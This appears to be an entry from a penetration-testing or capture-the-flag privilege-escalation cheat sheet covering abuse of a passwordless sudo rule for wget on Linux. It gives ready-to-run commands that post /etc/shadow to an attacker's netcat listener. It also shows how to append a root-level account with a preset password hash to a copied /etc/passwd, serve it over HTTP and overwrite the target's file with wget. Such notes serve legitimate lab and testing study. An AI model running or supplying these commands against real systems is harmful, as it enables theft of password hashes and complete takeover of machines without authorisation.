- - -
## (root) NOPASSWD: /usr/sbin/wget :

#### On Kali machine :

```sh
nc -nvlp 9090
```

#### On Target machine :

```sh
sudo wget --post-file=/etc/shadow <our_kali_ip>:9090
```

**OR**

#### On Target machine :

```
cat /etc/passwd
```

**Copy** whole file and **paste** it on your Kali machine in a new file named "**fakepasswd**"

#### On Kali machine : 

```sh
echo 'p1yush:$1$siren$4ncSQPoF9SlZhPfGISJ4b1:0:0:root:/root:/bin/bash' >> fakepasswd
```

```python
python3 -m http.server 80 
```

#### On Target machine :

```sh
cd /etc ; wget -O passwd http://10.8.0.239:80/passwd
```

- - -

